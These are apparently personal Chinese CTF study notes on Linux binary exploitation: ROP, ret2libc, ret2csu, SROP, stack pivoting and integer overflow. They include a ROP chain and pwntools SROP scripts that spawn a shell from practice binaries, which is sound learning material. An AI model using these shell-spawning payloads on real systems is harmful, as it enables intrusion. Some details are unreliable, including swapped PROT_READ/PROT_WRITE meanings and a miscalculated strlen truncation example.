<p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p>
<p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h3><p> MOVS ：复制ESI指向的内存到EDI指向的内存，并ESI EDI加所复制的宽度 </p>
<p> STOS :将EAX 的数据复制到EDI指定的内存  （寄存器和内存交互）</p>
<p> REP: 循环次数由cx决定</p>
<p> TEST:对两个参数(目标，源)执行AND逻辑操作，并根据结果设置<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/5757541">标志寄存器</a>，结果本身不会保存 </p>
<blockquote>
<p>将两个操作数进行按位AND,设结果是TEMP<br>SF = 将结果的最高位赋给SF标志位，例如结果最高位是1，SF就是1　　<br>看TEMP是不是0<br>如果TEMP是0，ZF位置1<br>如果TEMP不是0，ZF位置0　<br>PF = 将TEMP的低8位，从第0位开始，逐位取同或。也就是第0位与第1位的同或结果，去和第2位同或，结果再去和第3位同或….直到和第7位同或。<br>CF位置0<br>OF位置0<br>AF位是未定的，鬼知道是什么　　<br>下面我们来看看这么做是否合理：<br>SF位是符号位。对于有符号的数据，最高位正好是符号位，合理。<br>ZF位记录操作的结果是否是0， 合理。 </p>
<p>PF位是奇偶校验位，如果结果低8位中1的个数是偶数，PF=1；否则PF=0. </p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>JO</td>
<td>溢出跳转</td>
</tr>
<tr>
<td>JNO</td>
<td>不溢出跳转</td>
</tr>
<tr>
<td>JB</td>
<td>低于跳转</td>
</tr>
<tr>
<td>JNB</td>
<td>不低于跳转</td>
</tr>
<tr>
<td>JE</td>
<td>相等跳转</td>
</tr>
<tr>
<td>JNE</td>
<td>不等跳转</td>
</tr>
<tr>
<td>JBE</td>
<td>不高于跳转</td>
</tr>
<tr>
<td>JA</td>
<td>高于跳转</td>
</tr>
<tr>
<td>JS</td>
<td>负号跳转</td>
</tr>
<tr>
<td>JNS</td>
<td>非负跳转</td>
</tr>
<tr>
<td>JP</td>
<td>奇偶跳转</td>
</tr>
<tr>
<td>JNP</td>
<td>非奇偶跳转</td>
</tr>
<tr>
<td>JL</td>
<td>小于跳转</td>
</tr>
<tr>
<td>JNL</td>
<td>不小于跳转</td>
</tr>
<tr>
<td>JNG</td>
<td>不大于跳转</td>
</tr>
<tr>
<td>JG</td>
<td>大于跳转</td>
</tr>
<tr>
<td>JZ</td>
<td>等于0跳转</td>
</tr>
<tr>
<td>JNZ</td>
<td>不为0跳转</td>
</tr>
<tr>
<td>JC</td>
<td>进位跳转</td>
</tr>
<tr>
<td>JNC</td>
<td>不进位跳转</td>
</tr>
</tbody></table>
<h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><ul>
<li> <strong>char *fgets(char *str, int n, FILE *stream)</strong>  ‘\n’截断</li>
<li>  <strong>int strcmp(const char *str1, const char *str2)</strong> 把 <strong>str1</strong> 所指向的字符串和 <strong>str2</strong> 所指向的字符串进行比较 ‘\x00’截断 <strong>只有当前后两个字符串同时遇见\x00时，比较才停止</strong></li>
<li> <strong>char *strchr(const char *str, int c)</strong> 在参数 <strong>str</strong> 所指向的字符串中搜索第一次出现字符 <strong>c</strong>（一个无符号字符）的位置 </li>
<li> <strong>char *strcat(char *dest, const char *src)</strong> 把 <strong>src</strong> 所指向的字符串追加到 <strong>dest</strong> 所指向的字符串的结尾 </li>
<li>  <strong>char *strcpy(char *dest, const char *src)</strong> 把 <strong>src</strong> 所指向的字符串复制到 <strong>dest</strong></li>
<li>  <strong>void setbuf(FILE *stream, char *buffer)</strong>    定义流 stream 应如何缓冲。  <strong>buffer</strong> – 这是分配给用户的缓冲，它的长度至少为 BUFSIZ 字节，BUFSIZ 是一个宏常量，表示数组的长度。 </li>
<li>  <strong>int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</strong>    如果成功，则该函数返回 0，否则返回非零值。 </li>
<li>   *<em>long int strtol(const char *str, char *<em>endptr, int base)</em></em> 把参数 <strong>str</strong> 所指向的字符串根据给定的 <strong>base</strong> 转换为一个长整数（类型为 long int 型），base 必须介于 2 和 36（包含）之间，或者是特殊值 0。 </li>
<li>   <strong>void *memcpy(void *str1, const void *str2, size_t n)</strong> 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>。 </li>
<li>   <strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。 </li>
<li>   <strong>char *strstr(const char *haystack, const char *needle)</strong>  在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’。 </li>
<li>  scanf(“%s”,&amp;a)  ’\x0a‘,’\x20’ 截断，’\x00‘不截断</li>
<li>   <strong>char *strtok(char *str, const char *delim)</strong> 分解字符串 <strong>str</strong> 为一组字符串，<strong>delim</strong> 为分隔符。 </li>
</ul>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>_IOFBF</td>
<td><strong>全缓冲</strong>：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。</td>
</tr>
<tr>
<td>_IOLBF</td>
<td><strong>行缓冲</strong>：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。</td>
</tr>
<tr>
<td>_IONBF</td>
<td><strong>无缓冲</strong>：不使用缓冲。每个 I/O 操作都被即时写入。buffer 和 size 参数被忽略。</td>
</tr>
</tbody></table>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><strong>使用条件</strong>：栈不可写。bss段或堆有执行和可写权限。</p>
<p><strong>nx开启时，bss和栈都没有可执行权力</strong></p>
<p>context(os=’linux’,arch=’amd64’,log_level=’debug’)         环境转换</p>
<p>asm(shellcraft.amd64.sh())   将后门汇编或反汇编</p>
<p>.ljust(length,shuju)     从左开始不足填充</p>
<p>ROPgadget –binary 文件 –only “pop|ret”  |  grep eax   查找汇编代码和地址</p>
<p>one_gadget libc-    .so</p>
<p>flat（[]）   列表里每个元素都转换成字节型发送</p>
<p><strong>mprotect</strong>： mprotect(const void *start, size_t len, int prot) </p>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
<p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>例题：cmcc_simplerop</p>
<p><strong>使用条件</strong>：静态链接</p>
<h6 id=""><a href="#" class="headerlink" title=""></a><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201206145503600.png"></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = &#x27;a&#x27;*0x20</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += &#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += &#x27;/sh\x00&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e850)#pop_edx_ecx_ebx</span><br><span class="line">p += p32(0)+p32(0)+p32(0x80ea060)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06)#pop eax ; ret</span><br><span class="line">p += p32(0xb)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure>



<p>64位程序使用syscall代替int 80。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tcctw/p/11450449.html">linux系统调用表（64位）</a> 其中rdi应存放”/bin/sh“的地址。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/107249667">32位系统调用表</a></p>
<table>
<thead>
<tr>
<th>系统调用</th>
<th>调用号</th>
<th>系统调用</th>
<th>调用号</th>
</tr>
</thead>
<tbody><tr>
<td>exit</td>
<td>1</td>
<td>fork</td>
<td>2</td>
</tr>
<tr>
<td>read</td>
<td>3</td>
<td>write</td>
<td>4</td>
</tr>
<tr>
<td>open</td>
<td>5</td>
<td>close</td>
<td>6</td>
</tr>
<tr>
<td>waitpid</td>
<td>7</td>
<td>creat</td>
<td>8</td>
</tr>
<tr>
<td>link</td>
<td>9</td>
<td>unlink</td>
<td>10</td>
</tr>
<tr>
<td>execve</td>
<td>11</td>
<td>chdir</td>
<td>12</td>
</tr>
<tr>
<td>time</td>
<td>13</td>
<td>mknod</td>
<td>14</td>
</tr>
</tbody></table>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><strong>使用条件</strong>：有系统调用函数system，存在字符串/bin/sh </p>
<p>LibcSearcher</p>
<p>elf = ELF（’./文件’）</p>
<p>hex（next（elf.search(b”/bin/sh”)））  //python3需要加b，得到字符串的地址</p>
<p>elf.search().next()   //python2</p>
<p>elf.plt[‘system’]   systemplt地址</p>
<p>elf.symbols[“”]  获取变量的地址</p>
<p>strings 文件，返回文件的字符串，配合 ‘|’   strings  文件  |  grep  字符串</p>
<p>ROPgadget –binary  文件  –string  ‘字符串’</p>
<p>‘\x00’ 截断符</p>
<p>cyclic()生成垃圾数据</p>
<p>u32/64是p32/p64的逆运算</p>
<p>没有给libc时，使用libc共享库，ldd 文件名 查看</p>
<p>io.shutdown_raw(‘send’)   关闭管道的send方向，使远程read()读到EOF，返回0</p>
<blockquote>
<p>write泄露地址时有三个参数 0标准输入流 1标准输出流</p>
</blockquote>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201211091110573.png" alt="image-20201211091110573"></p>
<p><strong>x64的ret2libc</strong>：前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中，第7个以后的参数存放于栈中</p>
<p>下图0x5处有 pop rbp</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201223203046179.png" alt="image-20201223203046179"></p>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p><strong>使用条件：</strong> 动态链接的程序</p>
<p> 利用 x64 下的 __libc_csu_init 中的 gadgets ,可以控制rbx、rbp、r12、r13、r14、r15、rdx、rsi、edi（相当于rdi），同时<code>call    qword ptr [r12+rbx*8]</code> 可以将r12填上任意函数的地址达成任意函数调用。call [](中括号为取地址符，也就是说应将r12填上函数的got地址。当要改变程序执行流时，应填上指向目的地址指针的地址。因此可以直接用函数的got地址)</p>
<p> 从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>



<h3 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h3><ol>
<li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
<li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>
</ol>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>当有中断或异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文，再跳转到之前注册好的signal handler中进行处理，待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。具体步骤：</p>
<ul>
<li>一个signal frame 被添加到栈，frame中包含了当前寄存器的值和一些signal信息。</li>
<li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn系统调用。</li>
<li>signal handler被调用，signal handler的行为取决于收到什么signal</li>
<li>signal handler执行完后，如果程序没有终止，则返回地址用于执行sigreturn系统调用</li>
<li>sigreturn 利用signal frame 恢复所有寄存器以回到之前的状态</li>
<li>程序继续执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//32位</span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//64位</span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  __uint64_t r8;</span><br><span class="line">  __uint64_t r9;</span><br><span class="line">  __uint64_t r10;</span><br><span class="line">  __uint64_t r11;</span><br><span class="line">  __uint64_t r12;</span><br><span class="line">  __uint64_t r13;</span><br><span class="line">  __uint64_t r14;</span><br><span class="line">  __uint64_t r15;</span><br><span class="line">  __uint64_t rdi;</span><br><span class="line">  __uint64_t rsi;</span><br><span class="line">  __uint64_t rbp;</span><br><span class="line">  __uint64_t rbx;</span><br><span class="line">  __uint64_t rdx;</span><br><span class="line">  __uint64_t rax;</span><br><span class="line">  __uint64_t rcx;</span><br><span class="line">  __uint64_t rsp;</span><br><span class="line">  __uint64_t rip;</span><br><span class="line">  __uint64_t eflags;</span><br><span class="line">  unsigned short cs;</span><br><span class="line">  unsigned short gs;</span><br><span class="line">  unsigned short fs;</span><br><span class="line">  unsigned short __pad0;</span><br><span class="line">  __uint64_t err;</span><br><span class="line">  __uint64_t trapno;</span><br><span class="line">  __uint64_t oldmask;</span><br><span class="line">  __uint64_t cr2;</span><br><span class="line">  __extension__ union</span><br><span class="line">    &#123;</span><br><span class="line">      struct _fpstate * fpstate;</span><br><span class="line">      __uint64_t __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  __uint64_t __reserved1 [8];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210419213222530.png" alt="image-20210419213222530"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210419213339346.png" alt="image-20210419213339346"></p>
<p>**当一个signal handler退出时，栈顶如下图所示(rdi rax rip是我们想要修改成的值)**：</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210419214339319.png" alt="image-20210419214339319"></p>
<p> 当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p>
<ul>
<li> 当执行sigreturn时，栈上的值：当准备要执行sigreturn时，栈上的第一个值为<code>uc_flag</code>。</li>
</ul>
<p>  <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210506203252016.png" alt="image-20210506203252016"></p>
<p><strong>“sigreturn;retn”该gadget地址在一些较老的系统上是没有随机化的，通常可以在vsyscall中找到，地址为：0xffffffffff600000，如果是32位linux，则可以寻找”int 80”指令，通常可以在vDSO中找到，但这个地址可能是随机的。</strong></p>
<p> 值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。 </p>
<p>例题：</p>
<ul>
<li>ciscn_s_3</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">io = process(&#x27;./ciscn_s_3&#x27;)</span><br><span class="line"></span><br><span class="line">vuln = 0x4004ed</span><br><span class="line">sigreturn = 0x4004da</span><br><span class="line">syscall = 0x400501</span><br><span class="line"></span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x10,&#x27;a&#x27;)</span><br><span class="line">payload += p64(vuln)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(0x20)</span><br><span class="line">binsh = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-280</span><br><span class="line">print(hex(binsh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x10,&#x27;a&#x27;)</span><br><span class="line">payload += p64(sigreturn) + p64(syscall) + str(frame)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>small</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./small&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">elf.ELF(&#x27;./small&#x27;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;*(0x10)+p64(0x402020)+p64(0x401015)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input()#用此函数隔断send</span><br><span class="line">payload = &#x27;a&#x27;*0x10+p64(0x402060)+p64(0x401015)+p64(0x40100a)*8</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = 0x402168</span><br><span class="line">frame2.rsi = 0</span><br><span class="line">frame2.rdx = 0</span><br><span class="line">frame2.rsp = 0x402080</span><br><span class="line">frame2.rip = 0x40100a</span><br><span class="line">frame2.r8 = 3</span><br><span class="line">frame2.r9 = 4</span><br><span class="line">frame2.r10 = 5</span><br><span class="line">frame2.r11 = 6</span><br><span class="line">payload += str(frame2)</span><br><span class="line">print(len(str(frame2)))</span><br><span class="line">payload += &#x27;/bin/sh\x00&#x27;</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(&#x27;a&#x27;*0xf)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p><strong>使用条件</strong>：函数返回时有leave，ret指令</p>
<p>利用两次的leave，ret  使rsp/esp被我们控制，控制后即可为所欲为</p>
<p>栈的对齐/堆栈平衡： 实际是指栈顶指针必须须是16字节的整数倍 </p>
<p><strong>堆栈平衡</strong>：</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210601170711924.png" alt="image-20210601170711924"></p>
<p><strong>在构建栈时，栈上的/bin/sh必须是其地址</strong></p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p><strong>strlen的溢出</strong></p>
<p>用来表示字符串长度的参数v3，它定义的类型是unsigned_int8(无符号整型),它所能表示的数的范围是0~2^8-1(255),而我们读入的字符串buf的最大长度是0x400（1024），1024超过了v3所能表示的范围，所以 这里存在整数溢出漏洞，关于整数溢出的具体讲解–&gt;<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/</a></p>
<p>关于strlen（）这个函数，上述链接里也有提到，如果参数的长度大于了它的固定的长度，就会将前面的扔掉，留下剩下的<br> <strong>举个例子：a的长度为260，b也是定义的unsigned_int8，因此b=strlen（a）=260-255=5</strong></p>
<p><strong>整型的溢出</strong>（有符号存储数的补码）</p>
<p>当 int 类型变为 unsigned int 类型，负数会变成很大的数。</p>
